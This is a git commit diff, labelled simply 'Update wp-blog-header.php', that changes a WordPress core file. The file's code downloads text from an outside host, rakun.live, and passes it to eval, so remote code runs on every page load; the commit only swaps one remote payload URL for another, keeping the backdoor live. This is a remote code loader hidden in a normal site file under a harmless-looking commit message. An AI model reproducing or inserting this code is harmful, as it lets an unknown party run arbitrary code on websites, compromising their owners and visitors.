cabf0cf7b57951f9cb588122877fc0c1ffd31087
batskulah <alfanpekan@gmail.com>
2025-12-30 16:35:10 +0700

    Update wp-blog-header.php

--- wp-blog-header.php
+++ wp-blog-header.php
@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/apisss.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/nutri.txt'));
 $url = "?> ".$url;
 eval($url);
 
